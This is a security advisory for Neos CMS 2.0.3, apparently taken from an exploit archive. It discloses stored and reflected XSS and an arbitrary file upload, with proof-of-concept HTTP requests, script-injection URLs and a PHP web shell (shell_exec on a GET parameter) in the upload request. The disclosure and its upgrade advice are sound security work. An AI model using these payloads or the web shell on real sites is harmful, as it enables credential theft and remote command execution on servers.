@@ -1,0 +1,138 @@
+id: 24607
+date: 11/25/2015
+title: Neos CMS 2.0.3 Cross Site Scripting / Shell Upload Vulnerabilities
+author: Mickael Dorigny
+cves: 
+
+######################################################################
+# Exploit Title: Neos/Flow multiple vulnerabilities
+# Date: 24/11/2015
+# Author: Mickael Dorigny @ Synetis
+# Vendor or Software Link: https://www.neos.io/
+# Version: <= 2.0.3
+# Category: Multiple Vulnerabilities
+# Tested on : Neos 2.0.3
+######################################################################
+
+Neos/Flow Content Application Platform description :
+======================================================================
+Neos is an open source Content Application Platform based on its own PHP framework (Flow). A set of core Content Management features is resting within a larger context that allows to build a customized experience for users.
+
+Vulnerability description :
+======================================================================
+Neos 2.0.3 is vulnerable to multiple vulnerabilities like :
+- Reflected XSS (without authentication)
+- multiple Stored-XSS (with authentication as simple user, editor or administrateor)
+- Arbitrary File Upload(Editor and Administrator)
+
+Neos is developed in PHP with the Flow PHP Framework which as also been updated.
+
+Proof of Concept n°1 - Reflected Cross-Site Scripting (SXSS) with editor or administrator authentication :
+================================================================================================
+An user with "Editor" or "Administrator" permissions can modify an article or page content in a way to make execution of JavaScript instructions.
+
+PoC :
+
+An attacker with "Editor" or "Administrator" permissions have to inject JavaScript instruvctions in the edited pagecontent in the modification panel "In-Place" or "Raw" mode. Then, another user reviewing this same content in "Print" or "Desktop" preview mode will executes the JavaScript instruction. 
+
+Through this vulnerability, an attacker could tamper with page rendering, redirect victim to fake login page, or capture users credentials such cookies. Moreover, an user with "Editor" privileges can use this vulnerability to steal Administrator cookie to lead privileges escalation in Neos.
+
+
+Proof of Concept n°2 - Reflected Cross-Site Scripting (SXSS) with user authentication :
+================================================================================================
+An user who can modify his profile informations "Title", "First Name", "Last name", "Middle Name", "Other Name" can inject Javascript instructions in those parameters.
+
+Once set up, an Administrator who wants to edit this user account and go to "Edit" of this account will executes JavaScript instructions.  
+
+PoC :
+
+POST http://webserver/neos/user/usersettings/update HTTP/1.1
+Referer: http://webserver/neos/user/usersettings/edit.html
+
+[Vulnerable form input via post data]
+[user][title]=<script>alert("SXSS01")</script>
+[user][name][firstName]=<script>alert("SXSS02")</script>
+[user][name][middleName]=<script>alert("SXSS03")</script>
+[user][name][lastName]=<script>alert("SXSS04")</script>
+[user][name][otherName]=<script>alert("SXSS05")</script>
+
+Through this vulnerability, an attacker could tamper with page rendering, redirect victims to fake login page, or capture users credentials such cookies. Moreover, an user with "Editor" privileges can use this vulnerbility to steal Administrator cookie to lead privileges escalation Neos.
+
+Proof of Concept n°3 - Reflected Cross-Site Scripting (RXSS) without authentication :
+================================================================================================
+A non-persitent XSS (RXSS) in GET parameter passed during user creation is available in Neos 2.0.3.
+
+When the "newaccount" value is modified for the "--typo3_neosdemotypo3org-registration[@action]" parameter, an error message is displayed. This error message writes back the mispelled value. Then we can inject JavaScript instructions in the "--typo3_neosdemotypo3org-registration[@action]" paramater.
+
+PoC :
+
+http://webserver/neos/en/try-me.html?--typo3_neosdemotypo3org-registration[@package]=typo3.neosdemotypo3org&--typo3_neosdemotypo3org-registration[@controller]=registration&--typo3_neosdemotypo3org-registration[@action]=<script>alert("RXSS")</script>newaccountmispelled
+
+In some implementations of Neos, error message can be hidden via <!-- --> HTML code. In this context, this PoC works, we just have to close the HTML comment in our injection : 
+http://webserver/neos/en/try-me.html?--typo3_neosdemotypo3org-registration[@package]=typo3.neosdemotypo3org&--typo3_neosdemotypo3org-registration[@controller]=registration&--typo3_neosdemotypo3org-registration[@action]=--><script>alert("RXSS")</script>newaccountmispelled
+
+Through this vulnerability, an attacker could tamper with page rendering, redirect victim to fake login page, or capture users credentials such cookies.
+
+Proof of Concept n°4 - Arbitrary File Upload :
+================================================================================================
+With an user account with "Editor" or "Administrator", it is possible to upload arbitrary file.
+
+Through this vulnerability, an attacker could upload other type than image file like PHP script. A PHP script can give additional action possibility like executing instructions on the server side.
+
+PoC :
+
+POST http://webserver/neos/management/media/upload?__csrfToken=xxxxxxxxxe3
+ Type Mime[text/html]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0]
+      Referer[http://webserver/neos/management/media/]
+      Content-Type[multipart/form-data; boundary=---------------------------32007199347844]
+   Données POST:
+      POST_DATA[-----------------------------32007199347844
+Content-Disposition: form-data; name="name"
+
+file.php
+-----------------------------32007199347844
+Content-Disposition: form-data; name="moduleArguments[asset][resource]"; filename="file.php"
+Content-Type: application/octet-stream
+
+<?php
+$output = shell_exec($_GET['cmd']);
+echo "<pre>$output</pre>";
+?>
+-----------------------------32007199347844--
+]
+
+This arbitrary file can then be retrieved through the "Media" panel which gives the full URL to the selected file.
+
+Screenshots :
+======================================================================
+
+- http://www.information-security.fr/wp-content/uploads/2015/11/neos-2-0-3-multiple-vulnerabilities-03.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/11/neos-2-0-3-multiple-vulnerabilities-05.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/11/neos-2-0-3-multiple-vulnerabilities-08.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/11/neos-2-0-3-multiple-vulnerabilities-09.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/11/neos-2-0-3-multiple-vulnerabilities-12.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/11/neos-2-0-3-multiple-vulnerabilities-16.jpg
+
+
+Solution: 
+======================================================================
+
+- I suggest to upgrade your Neos installation to the next version (2.0.4) : https://github.com/neos/neos-development-collection/releases/tag/2.0.4
+ 
+Additional resources :
+======================================================================
+- Article https://information-security.fr/en/sxss-rxss-arbitrary-file-upload-neos-cms-version-2-0-3
+- Video Poc : https://www.youtube.com/watch?v=j0Mli_EQpQo
+- Official security fixes for Neos / Flow: https://www.neos.io/news/neos-flow-security-fixes.html
+
+Report timeline :
+======================================================================
+ 
+2015-11-09 : Informed Vendor about issues
+2015-11-09 : Vendor response and investigation
+2015-11-11 : Vendor feedback concerning new version 
+2015-11-24 : New version of the product released
+2015-11-24 : Public Advisory released
+
+#  0day.today [2023-03-27]  #
